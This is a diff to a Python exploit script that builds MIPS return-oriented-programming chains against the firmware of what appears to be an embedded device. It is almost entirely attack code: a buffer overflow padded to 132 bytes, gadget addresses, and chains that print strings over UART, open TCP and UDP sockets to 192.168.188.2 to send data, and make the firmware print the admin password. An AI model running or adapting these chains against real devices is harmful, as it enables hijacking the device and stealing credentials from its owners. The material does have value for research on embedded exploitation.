@@ -399,134 +399,134 @@ elif args.command == 'http':
     elif args.rop:
         base_address = 0x80000400
         # Padding 
-        rop_chain = b'a'*132
+        chain = b'a'*132
 
         # Build the ROP chain
         if (args.rop[0] == '1'): # print 'hello_core.con' to uart/telnet command line
             ## print 'hello'
             # Add the strings to the sX registers, and set the ra to first gadget
-            rop_chain += to_addr(0x801d3754) # s0 ('hello')
-            rop_chain += to_addr(0x801c3f91) # s1 ("%s")
-            rop_chain += to_addr(0xdeadbeef) # s2
-            rop_chain += to_addr(0xdeadbeef) # s3
-            rop_chain += to_addr(0x12ba10 + base_address) # ra
+            chain += p32(0x801d3754) # s0 ('hello')
+            chain += p32(0x801c3f91) # s1 ("%s")
+            chain += p32(0xdeadbeef) # s2
+            chain += p32(0xdeadbeef) # s3
+            chain += p32(0x12ba10 + base_address) # ra
             
             # 0x0012ba10: move $a1, $s0; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
-            rop_chain += to_addr(0xdeadbeef) # s0
-            rop_chain += to_addr(0x187a30 + base_address) # ra
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0x187a30 + base_address) # ra
 
             # 0x00187a30: move $a0, $s1; lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
-            rop_chain += b'a'*4
-            rop_chain += to_addr(0xdeadbeef) # s0
-            rop_chain += to_addr(0xdeadbeef) # s1
-            rop_chain += to_addr(0x57864 + base_address)
+            chain += b'a'*4
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdeadbeef) # s1
+            chain += p32(0x57864 + base_address)
 
             # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
-            rop_chain += to_addr(0x8019a3a0) # v0 - printf address
-            rop_chain += b'a' * 8
-            rop_chain += to_addr(0x15114 + base_address) # ra
+            chain += p32(0x8019a3a0) # v0 - printf address
+            chain += b'a' * 8
+            chain += p32(0x15114 + base_address) # ra
 
             # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
-            rop_chain += b'a' * 4
-            rop_chain += to_addr(0x13478 + base_address) # ra
+            chain += b'a' * 4
+            chain += p32(0x13478 + base_address) # ra
 
             ## print 'core.c'
             # 0x00013478: lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
-            rop_chain += b'b' * 4
-            rop_chain += to_addr(0x801d8faf) # s0 ('core.c')
-            rop_chain += to_addr(0x801c3f91) # s1 ("%s")
-            rop_chain += to_addr(0x12ba10 + base_address) # ra
+            chain += b'b' * 4
+            chain += p32(0x801d8faf) # s0 ('core.c')
+            chain += p32(0x801c3f91) # s1 ("%s")
+            chain += p32(0x12ba10 + base_address) # ra
             
             # 0x0012ba10: move $a1, $s0; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
-            rop_chain += to_addr(0xdeadbeef) # s0
-            rop_chain += to_addr(0x187a30 + base_address) # ra
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0x187a30 + base_address) # ra
 
             # 0x00187a30: move $a0, $s1; lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
-            rop_chain += b'a'*4
-            rop_chain += to_addr(0xdeadbeef) # s0
-            rop_chain += to_addr(0xdeadbeef) # s1
-            rop_chain += to_addr(0x57864 + base_address)
+            chain += b'a'*4
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdeadbeef) # s1
+            chain += p32(0x57864 + base_address)
 
             # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
-            rop_chain += to_addr(0x8019a3a0) # v0 - printf address
-            rop_chain += b'a' * 8
-            rop_chain += to_addr(0x15114 + base_address) # ra
+            chain += p32(0x8019a3a0) # v0 - printf address
+            chain += b'a' * 8
+            chain += p32(0x15114 + base_address) # ra
 
             # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
-            rop_chain += b'a' * 4
-            rop_chain += to_addr(0x13478 + base_address) # ra
+            chain += b'a' * 4
+            chain += p32(0x13478 + base_address) # ra
 
             ## print 'on'
             # 0x00013478: lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
-            rop_chain += b'b' * 4
-            rop_chain += to_addr(0x801dcd98+0xa) # s0 ('on')
-            rop_chain += to_addr(0x801c3f91) # s1 ("%s")
-            rop_chain += to_addr(0x12ba10 + base_address) # ra
+            chain += b'b' * 4
+            chain += p32(0x801dcd98+0xa) # s0 ('on')
+            chain += p32(0x801c3f91) # s1 ("%s")
+            chain += p32(0x12ba10 + base_address) # ra
             
             # 0x0012ba10: move $a1, $s0; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
-            rop_chain += to_addr(0xdeadbeef) # s0
-            rop_chain += to_addr(0x187a30 + base_address) # ra
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0x187a30 + base_address) # ra
 
             # 0x00187a30: move $a0, $s1; lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
-            rop_chain += b'a'*4
-            rop_chain += to_addr(0xdeadbeef) # s0
-            rop_chain += to_addr(0xdeadbeef) # s1
-            rop_chain += to_addr(0x57864 + base_address)
+            chain += b'a'*4
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdeadbeef) # s1
+            chain += p32(0x57864 + base_address)
 
             # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
-            rop_chain += to_addr(0x8019a3a0) # v0 - printf address
-            rop_chain += b'a' * 8
-            rop_chain += to_addr(0x15114 + base_address) # ra
+            chain += p32(0x8019a3a0) # v0 - printf address
+            chain += b'a' * 8
+            chain += p32(0x15114 + base_address) # ra
 
             # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
-            rop_chain += b'a' * 4
-            rop_chain += to_addr(0xdeadbeef) # ra
-        elif (args.rop[0] == '2'): # send 'hello' over TCP socket to some device listening on network
+            chain += b'a' * 4
+            chain += p32(0xdeadbeef) # ra
+        elif (args.rop[0] == '2'): # send 'hello' over TCP socket to some device listening on network (WIP)
             
-            # #include <stdio.h>
-            # #include <stdlib.h>
-            # #include <sys/socket.h>
-            # #include <arpa/inet.h>
-            # #include <unistd.h>
+            """
+            // Trying to emulate this
 
-            # int main() {
-            #     int sock = socket(AF_INET, SOCK_STREAM, 0);
+            int main() {
+                int sock = socket(AF_INET, SOCK_STREAM, 0);
                 
-            #     struct sockaddr_in server;
-            #     server.sin_family = AF_INET;
-            #     server.sin_addr.s_addr = inet_addr("192.168.188.2");
-            #     server.sin_port = htons(4900);
+                struct sockaddr_in server;
+                server.sin_family = AF_INET;
+                server.sin_addr.s_addr = inet_addr("192.168.188.2");
+                server.sin_port = htons(4900);
                 
-            #     connect(sock, (struct sockaddr *)&server, sizeof(server));
+                connect(sock, (struct sockaddr *)&server, sizeof(server));
                 
-            #     char message[] = "hello";
-            #     send(sock, message, sizeof(message), 0);
+                char message[] = "hello";
+                send(sock, message, sizeof(message), 0);
                 
-            #     close(sock);
-            #     return 0;
-            # }
+                close(sock);
+                return 0;
+            }
+            """
             
+            # Useful function addresses
             socket_addr = 0x801293d0
-            connect_addr = 0x80129028
+            connect_addr = 0x80129028 # 100% connect
+            sleep_addr = 0x8019abac # (Based on this code from github - 0x8011b0bc)
 
-            # used at address 0x8015b398 in connect call so should work
-            sockfd_addr = 0x802ab9c0-100 #0x8025cdfc
-            sockaddr_addr = 0x802ab9c0-80 #0x8029a718
+            # Used at address 0x8015b398 in connect call so should work
+            sockfd_addr = 0x802ab9c0 - 100 #0x8025cdfc
+            sockaddr_addr = 0x802ab9c0 - 80 #0x8029a718
 
             # for our sockaddr struct as we cant send null bytes
             harcdoded_afinet = 0x800f9528 # port 4900
 
             # Add the strings to the sX registers, and set the ra to first gadget
-            rop_chain += to_addr(0xdeadbeef) # s0
-            rop_chain += to_addr(0xdeadbeef) # s1
-            rop_chain += to_addr(0xdeadbeef) # s2
-            rop_chain += to_addr(0xdeadbeef) # s3
-            rop_chain += to_addr(0x14d14 + base_address) # ra
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdeadbeef) # s1
+            chain += p32(0xdeadbeef) # s2
+            chain += p32(0xdeadbeef) # s3
+            chain += p32(0x11e670 + base_address) # ra
 
-            # Store the current stack pointer in a3
-            # 0x00014d14: move $a3, $sp; lw $ra, 0xc($sp); negu $v0, $v0; jr $ra; addiu $sp, $sp, 0x10; 
-            rop_chain += b'b' * 0xc
-            rop_chain += to_addr(0x11e670 + base_address) # ra
+                # # Store the current stack pointer in a3
+                # # 0x00014d14: move $a3, $sp; lw $ra, 0xc($sp); negu $v0, $v0; jr $ra; addiu $sp, $sp, 0x10; 
+                # chain += b'b' * 0xc
+                # chain += p32(0x11e670 + base_address) # ra
 
             ####################################################################
             ########## int socket(int domain, int type, int protocol); #########
@@ -534,59 +534,59 @@ elif args.command == 'http':
 
             # set first argument for socket to 2
             # 0x0011e670: addiu $a0, $zero, 2; lw $ra, 4($sp); move $v0, $zero; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
-            rop_chain += b'b'*4
-            rop_chain += to_addr(0x25b9c + base_address) # ra
+            chain += b'b'*4
+            chain += p32(0x25b9c + base_address) # ra
 
             # set second argument for socket to 1
             # 0x00025b9c: addiu $a1, $zero, 1; lw $ra, 0xc($sp); lw $s0, 8($sp); jr $ra; addiu $sp, $sp, 0x10;
-            rop_chain += b'a' * 8
-            rop_chain += to_addr(0xdeadbeef) # s0
-            rop_chain += to_addr(0x6d42c + base_address) # ra
+            chain += b'a' * 8
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0x6d42c + base_address) # ra
 
             # set third argument for socket to 0
             # 0x0006d42c: move $a2, $zero; lw $ra, 4($sp); addiu $v0, $zero, 1; jr $ra; addiu $sp, $sp, 8;
-            rop_chain += b'a' * 4
-            rop_chain += to_addr(0x57864 + base_address) # ra
+            chain += b'a' * 4
+            chain += p32(0x57864 + base_address) # ra
 
                     ##### Didn't work because branch delay slot :'(
                     # # 0x00073930: lw $v1, ($sp); lw $ra, 0xc($sp); move $v0, $s0; lw $s0, 8($sp); jr $ra; addiu $sp, $sp, 0x10;
-                    # rop_chain += to_addr(0xffffffff) # v1 - socket address
-                    # rop_chain += b'a' * 4
-                    # rop_chain += to_addr(0xdeadbeef) # s0
-                    # rop_chain += to_addr(0x175e34 + base_address) # ra
+                    # chain += p32(0xffffffff) # v1 - socket address
+                    # chain += b'a' * 4
+                    # chain += p32(0xdeadbeef) # s0
+                    # chain += p32(0x175e34 + base_address) # ra
 
                     # # 0x00175e34: jalr $v1; ori $a1, $a1, 0x6934; lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
-                    # rop_chain += b'b' * 0xc
-                    # rop_chain += to_addr(0xdeadb00f) # ra
+                    # chain += b'b' * 0xc
+                    # chain += p32(0xdeadb00f) # ra
 
                     ##### Didn't work because 2nd gadget clears v0 so we don't know the file descriptor of the socket cringe
                     # # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
-                    # rop_chain += to_addr(socket_addr) # v1 - socket address
-                    # rop_chain += b'a' * 8
-                    # rop_chain += to_addr(0x15114 + base_address) # ra
+                    # chain += p32(socket_addr) # v1 - socket address
+                    # chain += b'a' * 8
+                    # chain += p32(0x15114 + base_address) # ra
 
                     # # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
-                    # rop_chain += b'b' * 4
-                    # rop_chain += to_addr(0xdeadbeef)
+                    # chain += b'b' * 4
+                    # chain += p32(0xdeadbeef)
 
             # Load address of socket into v0
             # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
-            rop_chain += to_addr(socket_addr) # v0 - socket address
-            rop_chain += b'a' * 8
-            rop_chain += to_addr(0x80134158) # ra
+            chain += p32(socket_addr) # v0 - socket address
+            chain += b'b' * 8
+            chain += p32(0x133d58 + base_address) # ra
 
             # Call socket(2, 1, 0) and regain control
-            # 0x80134158: jalr $v0; nop; move $s0, $v0; lw $ra, 4($sp); move $v0, $s0; lw $s2, 8($sp); lw $s1, 0xc($sp); lw $s0, 0x10($sp); jr $ra; addiu $sp, $sp, 0x28;
-            rop_chain += b'a' * 24 # not sure why we need this, $sp probably gets adjusted or something
-            rop_chain += to_addr(sockfd_addr) # s0
-            rop_chain += to_addr(sockaddr_addr) # s1
-            rop_chain += to_addr(0xdeadbeef) # s2
-            rop_chain += to_addr(0x00185e38 + base_address) # ra
+            # 0x00133d58: jalr $v0; nop; move $s0, $v0; lw $ra, 0x24($sp); move $v0, $s0; lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x28;
+            chain += b'b' * 0x18
+            chain += p32(sockfd_addr) # s0
+            chain += p32(sockaddr_addr) # s1
+            chain += p32(0xdeadbeef) # s2
+            chain += p32(0x185e38 + base_address) # ra
 
             # save the socket file descriptor for use later, might not use but oh well
             # 0x00185e38: sw $v0, ($s0); lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
-            rop_chain += to_addr(0xdeadbeef) # s0
-            rop_chain += to_addr(0x1746c8 + base_address) # ra
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0x1746c8 + base_address) # ra
 
             ###############################################################################################
             ######### int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen); ############
@@ -594,168 +594,330 @@ elif args.command == 'http':
 
             # Move sockfd to a0 for connect
             # 0x001746c8: move $a0, $v0; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
-            rop_chain += to_addr(harcdoded_afinet) # s0
-            rop_chain += to_addr(0x57864 + base_address) # ra
+            chain += p32(harcdoded_afinet) # s0
+            chain += p32(0x57864 + base_address) # ra
 
             # s0 is our hardcoded ifnet address, s1 is our sockaddr address
             # Need to copy 4 bytes at s0 to 4 bytes at s1, load address of afinet into v0
             # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
-            rop_chain += to_addr(harcdoded_afinet) # v0
-            rop_chain += b'b' * 8
-            rop_chain += to_addr(0x1a46dc + base_address)
+            chain += p32(harcdoded_afinet) # v0
+            chain += b'b' * 8
+            chain += p32(0x1a46dc + base_address)
 
             # Load hardcoded afinet stuff into v0 (currently has the address)
             # 0x001a46dc: lw $v0, ($v0); lw $ra, 4($sp); jr $ra; addiu $sp, $sp, 8; 
-            rop_chain += b'b' * 4
-            rop_chain += to_addr(0x8013e534)
+            chain += b'b' * 4
+            chain += p32(0x13e134 + base_address)
 
             # Store the afinet stuff at our sockaddr struct
-            # 0x8013e534: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 0x8($sp); lw $s0, 0x4($sp); jr $ra; addiu $sp, $sp, 0x18;
-            rop_chain += b'b' * 4
-            rop_chain += to_addr(0xdeadbeef) # s0
-            rop_chain += to_addr(sockaddr_addr + 4) # s1
-            rop_chain += to_addr(0xdeadbeef) # s2
-            rop_chain += to_addr(0xdeadbeef) # s3
-            rop_chain += to_addr(0x57864 + base_address) # ra
+            # 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18; 
+            chain += b'b' * 4
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(sockaddr_addr + 4) # s1
+            chain += p32(0xdeadbeef) # s2
+            chain += p32(0xdeadbeef) # s3
+            chain += p32(0x57864 + base_address) # ra
 
             # Load the IP address into v0
             # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
-            rop_chain += struct.pack('>BBBB', 192, 168, 188, 2) # v0, IP
-            rop_chain += b'b' * 8
-            rop_chain += to_addr(0x8013e534) # ra
+            chain += struct.pack('>BBBB', 192, 168, 188, 2) # v0, IP
+            chain += b'b' * 8
+            chain += p32(0x13e134 + base_address) # ra
 
             # Store the loaded IP address at sockaddr + 4
-            # 0x8013e534: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 0x8($sp); lw $s0, 0x4($sp); jr $ra; addiu $sp, $sp, 0x18;
-            rop_chain += b'b' * 4
-            rop_chain += to_addr(sockaddr_addr) # s0
-            rop_chain += to_addr(0xdeadbeef) # s1
-            rop_chain += to_addr(0xdeadbeef) # s2
-            rop_chain += to_addr(0xdeadbeef) # s3
-            rop_chain += to_addr(0x1882bc + base_address) # ra
+            # 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18;
+            chain += b'b' * 4
+            chain += p32(sockaddr_addr) # s0
+            chain += p32(0xdeadbeef) # s1
+            chain += p32(0xdeadbeef) # s2
+            chain += p32(0xdeadbeef) # s3
+            chain += p32(0x1882bc + base_address) # ra
 
             # Move the sockaddr struct to a1
             # 0x001882bc: move $a1, $s0; lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10; 
-            rop_chain += b'b' * 4
-            rop_chain += to_addr(0xdeadbeef) # s0
-            rop_chain += to_addr(0xdeadbeef) # s1
-            rop_chain += to_addr(0x612d0 + base_address) # ra   
+            chain += b'b' * 4
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdeadbeef) # s1
+            chain += p32(0x612d0 + base_address) # ra   
 
             # 0x000612d0: addiu $a2, $zero, 0x20; lw $ra, 0x14($sp); lw $s1, 0x10($sp); lw $s0, 0xc($sp); jr $ra; addiu $sp, $sp, 0x18;
-            rop_chain += b'b' * 0xc
-            rop_chain += to_addr(0xdeadbeef) # s0
-            rop_chain += to_addr(0xdeadbeef) # s1
-            rop_chain += to_addr(0x57864 + base_address) # ra
+            chain += b'b' * 0xc
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdeadbeef) # s1
+            chain += p32(0x57864 + base_address) # ra
 
             # Load address of connect into v0
             # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
-            rop_chain += to_addr(connect_addr) # v0 - connect address
-            rop_chain += b'a' * 8
-            rop_chain += to_addr(0x80134158) # ra
+            chain += p32(connect_addr) # v0 - connect address
+            chain += b'b' * 8
+            chain += p32(0x133d58 + base_address) # ra
 
-            # Call connect and regain control
-            # 0x80134158: jalr $v0; nop; move $s0, $v0; lw $ra, 4($sp); move $v0, $s0; lw $s2, 8($sp); lw $s1, 0xc($sp); lw $s0, 0x10($sp); jr $ra; addiu $sp, $sp, 0x28;
-            rop_chain += b'a' * 200
+            # Call socket(2, 1, 0) and regain control
+            # 0x00133d58: jalr $v0; nop; move $s0, $v0; lw $ra, 0x24($sp); move $v0, $s0; lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x28;
+            chain += b'b' * 0x18
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdeadbeef) # s1
+            chain += p32(0xdeadbeef) # s2
+            chain += p32(0xdeadbeef) # ra
         elif (args.rop[0] == '3'): # send 'hello' over udp socket to some device
+            # Used at address 0x8015b398 in connect call so should work
+            sockfd_addr = 0x802ab9c0 - 100 #0x8025cdfc
+            sockaddr_addr = 0x802ab9c0 - 80 #0x8029a718
+
+            # for our sockaddr struct as we cant send null bytes
+            harcdoded_afinet = 0x800f9528 # port 4900
+
+            # Function address
+            sendto_addr = 0x80128bc4
+            socket_addr = 0x801293d0
+
             # Add the strings to the sX registers, and set the ra to first gadget
-            rop_chain += to_addr(0xdeadbeef) # s0
-            rop_chain += to_addr(0xdeadbeef) # s1
-            rop_chain += to_addr(0xdeadbeef) # s2
-            rop_chain += to_addr(0xdeadbeef) # s3
-            rop_chain += to_addr(0x14d14 + base_address) # ra
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdeadbeef) # s1
+            chain += p32(0xdeadbeef) # s2
+            chain += p32(0xdeadbeef) # s3
+            chain += p32(0x11e670 + base_address) # ra
 
-        elif (args.rop[0] == '4'): # turn on an led or something
-            # pAd address
-            pAd = 0x802d5d78
+            ####################################################################
+            ########## int socket(int domain, int type, int protocol); #########
+            ####################################################################
 
-            AndesLedEnhanceOp = 0x80109798 # pAd (a0), led_index (a1), on_time (a2), off_time (a3), led_param (t0)
+            # Set first argument for socket to 2
+            # 0x0011e670: addiu $a0, $zero, 2; lw $ra, 4($sp); move $v0, $zero; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
+            chain += b'b'*4
+            chain += p32(0x172e0c + base_address) # ra
+
+            # Set second argument for socket to 2 
+            # 0x00172e0c: move $a1, $zero; lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10;
+            chain += b'b' * 0xc
+            chain += p32(0x115428 + base_address)
+
+            # 0x00115428: addiu $a1, $a1, 2; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0x6d42c + base_address)
+
+            # set third argument for socket to 0
+            # 0x0006d42c: move $a2, $zero; lw $ra, 4($sp); addiu $v0, $zero, 1; jr $ra; addiu $sp, $sp, 8;
+            chain += b'b' * 4
+            chain += p32(0x57864 + base_address) # ra
+
+            # Load address of socket into v0
+            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
+            chain += p32(socket_addr) # v0 - socket address
+            chain += b'b' * 8
+            chain += p32(0x133d58 + base_address) # ra
+
+            # Call socket(2, 1, 0) and regain control
+            # 0x00133d58: jalr $v0; nop; move $s0, $v0; lw $ra, 0x24($sp); move $v0, $s0; lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x28; 
+            chain += b'b' * 0x18
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(sockaddr_addr) # s1
+            chain += p32(0xdeadbeef) # s2
+            chain += p32(0x1746c8 + base_address) # ra
+
+            ##########################################################################################################################################
+            ####### ssize_t sendto(int sockfd, const void *buf, size_t len, int flags, const struct sockaddr *dest_addr, socklen_t addrlen); #########
+            ##########################################################################################################################################
+
+            # Move sockfd to a0 for connect
+            # 0x001746c8: move $a0, $v0; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0x11e568 + base_address) # ra
+
+            # Move 'hello' into a1 (clobbers v0 but thats fine)
+            # 0x0011e568: lw $a1, ($sp); lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10; 
+            chain += p32(0x801d3754) # a1 (address of hello)
+            chain += b'b' * 0x8
+            chain += p32(0x100790 + base_address)
+
+            # Set a2 to be the length of the string 'hello\0' 
+            # 0x00100790: addiu $a2, $zero, 6; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
+            chain += b'b' * 0x4
+            chain += p32(0xbb6e4 + base_address)        
+
+            # Set a3 to be zero (flags)
+            # 0x000bb6e4: move $a3, $zero; lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
+            chain += b'b' * 0xc
+            chain += p32(0x57864 + base_address)
+
+            ## Set up sockaddr struct
+
+            # s1 has our sockaddr address, load address of afinet into v0
+            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
+            chain += p32(harcdoded_afinet) # v0
+            chain += b'b' * 8
+            chain += p32(0x1a46dc + base_address)
+
+            # Load hardcoded afinet stuff into v0 (currently has the address)
+            # 0x001a46dc: lw $v0, ($v0); lw $ra, 4($sp); jr $ra; addiu $sp, $sp, 8; 
+            chain += b'b' * 4
+            chain += p32(0x13e134 + base_address)
+
+            # Store the afinet stuff at our sockaddr struct
+            # 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18; 
+            chain += b'b' * 4
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(sockaddr_addr + 4) # s1
+            chain += p32(0xdeadbeef) # s2
+            chain += p32(0xdeadbeef) # s3
+            chain += p32(0x57864 + base_address) # ra
+
+            # Load the IP address into v0
+            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
+            chain += struct.pack('>BBBB', 192, 168, 188, 2) # v0, IP
+            chain += b'b' * 8
+            chain += p32(0x13e134 + base_address) # ra
+
+            # Store the loaded IP address at sockaddr + 4
+            # 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18;
+            chain += b'b' * 4
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdeadbeef) # s1
+            chain += p32(0xdeadbeef) # s2
+            chain += p32(0xdeadbeef) # s3
+            chain += p32(0x57864 + base_address) # ra
+
+            ## Load t0 value into v0
+            # Load v0 from stack
+            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
+            chain += p32(sockaddr_addr) # v0 - sockaddr address
+            chain += b'b' * 8
+            chain += p32(0x15d20c + base_address) # ra
+
+            # Move sockaddr from v0 into t0 (load v0 from stack, move into t0) #########Might need fixing need to check addresses!!!###########
+            # 0x0015d20c: move $t0, $v0; lw $ra, 0x2c($sp); addiu $s0, $zero, 0x163; move $v0, $s0; lw $s7, 0x28($sp); lw $s6, 0x24($sp); 
+            #   lw $s5, 0x20($sp); lw $s4, 0x1c($sp); lw $s3, 0x18($sp); lw $s2, 0x14($sp); lw $s1, 0x10($sp); lw $s0, 0xc($sp); jr $ra; addiu $sp, $sp, 0x30; 
+            chain += b'b' * 0xc
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdeadbeef) # s1
+            chain += p32(0xdeadbeef) # s2
+            chain += p32(0xdeadbeef) # s3
+            chain += p32(0xdeadbeef) # s4
+            chain += p32(0xdeadbeef) # s5
+            chain += p32(0xdeadbeef) # s6
+            chain += p32(0xdeadbeef) # s7
+            chain += p32(0x1895cc + base_address) # ra
+
+            # Move 0x20 into t1
+            # 0x001895cc: addiu $t1, $zero, 0x20; lw $ra, 0x2c($sp); lw $s2, 0x28($sp); lw $s1, 0x24($sp); lw $s0, 0x20($sp); jr $ra; addiu $sp, $sp, 0x30;
+            chain += b'b' * 0x20
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdeadbeef) # s1
+            chain += p32(0xdeadbeef) # s2
+            chain += p32(0x57864 + base_address) # ra
+
+            # Load address of sendto into v0
+            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
+            chain += p32(sendto_addr) # v0 - sendto address
+            chain += b'b' * 8
+            chain += p32(0x15114 + base_address) # ra
+
+            # Call sendto and regain control
+            # 0x15114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
+            chain += b'b' * 4
+            chain += p32(0xdeadbeef)
+        elif (args.rop[0] == '4'): # print the admin password to the uart
+            # Add the strings to the sX registers, and set the ra to first gadget
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0x80236c4c) # s1 (0x1010200)
+            chain += p32(0xdeadbeef) # s2
+            chain += p32(0xdeadbeef) # s3
+            chain += p32(0x12ba10 + base_address) # ra
+
+            # set a0 to be the id of the admin password
+            # 0x00187a30: move $a0, $s1; lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
+            chain += b'a'*4
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdeadbeef) # s1
+            chain += p32(0x104e7c + base_address)
+
+            # Move sp into a1
+            # 0x00104e7c: move $a1, $sp; lw $ra, 0x14($sp); lw $s1, 0x10($sp); lw $s0, 0xc($sp); jr $ra; addiu $sp, $sp, 0x18;
+            chain += b'a' * 0xc
+            chain += p32(0xdeadbeef) # s0
+            chain += p32(0xdeadbeef) # s1
+            chain += p32(0xaf2d4 + base_address) # ra
+
+            ## shift a1 (starts as sp) down a couple of times (100 bytes down)
+            for i in range(4):
+                # 1. add 0x770 to a1
+                # 0x000af2d4: addiu $a1, $a1, 0x770; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
+                chain += b'b' * 0x4
+                chain += p32(0x18bbc0 + base_address) # ra
             
-            # Add the strings to the sX registers, and set the ra to first gadget
-            rop_chain += to_addr(0xdeadbeef) # s0
-            rop_chain += to_addr(0xdeadbeef) # s1
